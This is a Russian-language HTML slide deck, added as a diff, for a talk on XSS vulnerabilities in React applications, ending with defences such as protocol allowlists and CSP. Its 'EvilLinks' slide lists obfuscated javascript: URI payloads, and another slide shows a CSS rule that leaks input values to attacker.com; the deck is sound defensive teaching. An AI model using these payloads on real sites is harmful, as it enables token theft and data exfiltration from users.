@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Уязвимости вашего React-приложения</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="shower/themes/ribbon/styles/styles.css">
+    <style>
+        .shower {
+            --slide-ratio: calc(16 / 9);
+        }
+
+        .center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body class="shower list">
+
+    <header class="caption">
+        <h1>Уязвимости вашего React-приложения</h1>
+    </header>
+
+    <section class="slide center" id="cover">
+        <h2>Уязвимости вашего React-приложения</h2>
+
+        <style>
+            #cover h2 {
+                font-size: 55px;
+            }
+        </style>
+    </section>
+
+    <section class="slide">
+        <h2>Что такое XSS?</h2>
+        <blockquote class="next">
+            <b>XSS</b> (Cross-Site Scripting) — тип атаки на веб-системы, заключающийся во внедрении в выдаваемую
+            веб-системой страницу вредоносного кода (который будет выполнен на компьютере
+            пользователя при открытии им этой страницы)
+        </blockquote>
+    </section>
+
+    <section class="slide">
+        <h2>Почему alert(1) на странице — страшно?</h2>
+        <ul class="next">
+            <li>украденные авторизационные токены
+            <li>выполнение действий от имени пользователей
+            <li>испорченый внешний вид и функциональность сайта
+        </ul>
+    </section>
+
+    <section class="slide">
+        <h2>«Но у меня же Реакт! Я слышал, он безопасный»</h2>
+        <a href="https://reactjs.org/docs/introducing-jsx.html" class="next"
+           target="_blank"><img src="pictures/react-doc.png" alt="react documentation screenshot"
+                                style="max-width: 80%"></a>
+    </section>
+
+    <section class="slide">
+        <h2>От чего Реакт спасает</h2>
+        <pre>
+            <code>return (</code>
+            <code>  &lt;input onChange={(_, value) => this.setState({value})}&gt;</code>
+            <code>  Привет, {this.state.value}!</code>
+            <code>)</code>
+        </pre>
+    </section>
+
+    <section class="slide center">
+        <h3>XSS не ограничивается вставкой тега script в разметку</h3>
+    </section>
+
+    <section class="slide center">
+        <h2>Самые опасные ситуации</h2>
+    </section>
+
+    <section class="slide">
+        <h2>Вставка ссылок</h2>
+        <pre>
+            <code>return (</code>
+            <code>  &lt;input onChange={e => this.setState({link: e.target.value}) } /&gt;</code>
+            <code>  &lt;a href={this.state.link}&gt;Нажми меня&lt;/a&gt;</code>
+            <code>)</code>
+        </pre>
+    </section>
+
+    <section class="slide">
+        <h2>EvilLinks</h2>
+        <ul>
+            <li>'javascript: alert(1)'
+            <li>'jav&amp;#x09;ascript:alert('XSS');'
+            <li>' &amp;#14;  javascript:alert('XSS');'
+            <li>&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29
+            <li>&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;
+            #0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041
+        </ul>
+    </section>
+
+    <section class="slide center">
+        <h2>dangerouslySetInnerHTML</h2>
+    </section>
+
+    <section class="slide center">
+        <h2>iframes</h2>
+    </section>
+
+    <section class="slide">
+        <h2>Вставка видео с youtube</h2>
+
+        <pre>
+            <code>&lt;iframe width="560" height="315"</code>
+            <code>  src="https://www.youtube.com/embed/GHhMJjPnezU" frameBorder="0"</code>
+            <code>  allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"</code>
+            <code>  allowFullScreen /&gt;</code>
+        </pre>
+    </section>
+
+
+    <section class="slide center">
+        <h2>Передача управления другой бибилиотеке</h2>
+    </section>
+
+    <section class="slide">
+        <h2>Markdown</h2>
+
+        <ul>
+            <li class="next">Общее доверие библиотеке</li>
+            <li class="next">Работа библиотеки со ссылками</li>
+            <li class="next">Возможность вставлять теги: какие теги и какие у них атрибуты?</li>
+        </ul>
+    </section>
+
+    <section class="slide">
+        <h2>Когда делаешь что-то без фреймворка</h2>
+
+        <pre>
+            <code>const wrp = document.getElementById('container');</code>
+            <code>wrp.<mark>innerHtml</mark> = <mark>location</mark>.pathname;</code>
+        </pre>
+    </section>
+
+    <section class="slide">
+        <h2>Подключение любой библиотеки</h2>
+
+        <p>Даже не делающей ничего с версткой</p>
+    </section>
+
+    <section class="slide">
+        <h2>Подключение библиотеки со стилями</h2>
+        <pre class="next">
+            <code>#form2 input[value$='a'] {</code>
+            <code>    background-image: url(https://attacker.com/?a);</code>
+            <code>}</code>
+        </pre>
+    </section>
+
+    <section class="slide">
+        <h2>Как от всего спастить?</h2>
+
+        <ul>
+            <li>Белые списки протоколов ссылок, атрибутов и тегов</li>
+            <li class="next">Недоверие к любому пользовательскому вводу, включая <code>window.location</code> и пришедшие с
+                сервера данные</li>
+            <li class="next">Content-Security Policy (CSP)</li>
+        </ul>
+    </section>
+
+
+    <div class="progress"></div>
+
+    <script src="shower/shower.min.js"></script>
+
+</body>
+</html>
